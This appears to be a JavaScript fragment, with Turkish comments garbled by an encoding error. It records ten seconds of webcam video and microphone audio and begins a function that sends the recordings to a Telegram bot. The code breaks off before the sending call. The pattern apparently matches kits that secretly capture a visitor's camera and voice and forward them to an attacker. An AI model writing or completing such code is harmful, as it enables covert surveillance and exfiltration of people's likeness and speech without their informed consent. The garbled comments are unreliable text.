// Video ve sesi al
function getVideoAndAudio(callback) {
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(function(stream) {
            var videoData = new MediaRecorder(stream);
            var audioData = new MediaRecorder(stream);

            // Video ve ses kayÄ±tlarÄ±nÄ± dinleme
            var videoChunks = [];
            var audioChunks = [];
            videoData.ondataavailable = function(event) {
                videoChunks.push(event.data);
            };
            audioData.ondataavailable = function(event) {
                audioChunks.push(event.data);
            };

            // KayÄ±t durduÄŸunda video ve sesi gÃ¶nderme
            videoData.onstop = function() {
                var videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                var audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                callback(videoBlob, audioBlob);
            };

            // KayÄ±tÄ± baÅŸlatma
            videoData.start();
            audioData.start();

            // KayÄ±tÄ± durdurma
            setTimeout(function() {
                videoData.stop();
                audioData.stop();
            }, 10000); // 10 saniye sonra kaydÄ± durdur
        })
        .catch(function(err) {
            console.error('Video ve ses alÄ±namadÄ±:', err);
        });
}

// Video veya sesi Telegram botuna gÃ¶nder
function sendMediaToTelegramBot(mediaData, type) {
    var formData = new FormData();
